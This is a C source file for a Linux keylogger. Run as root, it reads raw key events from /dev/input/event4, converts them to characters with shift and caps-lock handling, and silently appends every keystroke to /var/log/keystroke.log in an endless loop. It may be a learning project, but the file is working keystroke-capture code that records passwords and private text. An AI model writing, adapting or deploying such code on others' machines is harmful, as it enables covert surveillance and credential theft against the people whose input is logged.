#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <linux/input.h>
#include "functions.h"
#include "define.h"


// initializations
input_event event;
int shift = 0;
int caps = 0;				// assuming capslock to be off


// checking for shift key
static int isShiftPressed(int eventcode){
	if((eventcode == LEFTSHIFT) || (eventcode == RIGHTSHIFT)){
		return 1;
	}
	return 0;
}


// checking for capslock
static int isCapsOn(int eventcode){
	if(eventcode == CAPSLOCK){
		return 1;
	}
	return 0;
}


// check for chars like !@#$%^&*()_{}:"<>?
static char *checkKey(char *key){
	for(int i=0; i<20; i++){
		if(special_chars[0][i] == key){
			return special_chars[1][i];
		}
	}
	return key;
}


// convert event code to corresponding char
static char *pressedKey(int eventcode){
	if(shift^caps){
		char *key = keys_upper[eventcode];
		if(shift == 1){
			key = checkKey(key);
		}
		return key;
	}
	return keys_lower[eventcode];
}


// main function
int main(){

	// root check
	if(geteuid() != ROOTID){
		printf("You must be root\n");
		exit(0);
	}

	// log file
	FILE *lf = fopen("/var/log/keystroke.log", "ab");

	// log file check
	if(lf == NULL){
		printf("Error in opening Log file\n");
		exit(0);
	}

	/* To disable buffering and allow writing to log file 
		as soon as a key is pressed. */
	setbuf(lf, NULL);

	// device file
	int fp = open("/dev/input/event4", O_RDONLY);

	// device check
	if(fp == -1){
		printf("Device file not found\n");
		exit(0);
	}

	// capturing keystrokes
	while(1){
		if(read(fp, &event, sizeof(input_event))>0){
			if(event.type == EV_KEY){					// checking event type to be of keyboard
				if(event.value == KEY_PRESS){
					if(isShiftPressed(event.code)){
						shift = 1;
					}
					if(isCapsOn(event.code)){
						caps = caps^1;					// switching caps value on every keypress
					}
					char *key = pressedKey(event.code);
					fputs(key, lf);
				}
				if(event.value == KEY_RELEASE){
					if(isShiftPressed(event.code)){
						shift = 0;
					}
				}
			}
		}
	}

	// close file
	close(fp);
	fclose(lf);

	// footer
	printf("Exiting...\n");

	return 0;
}
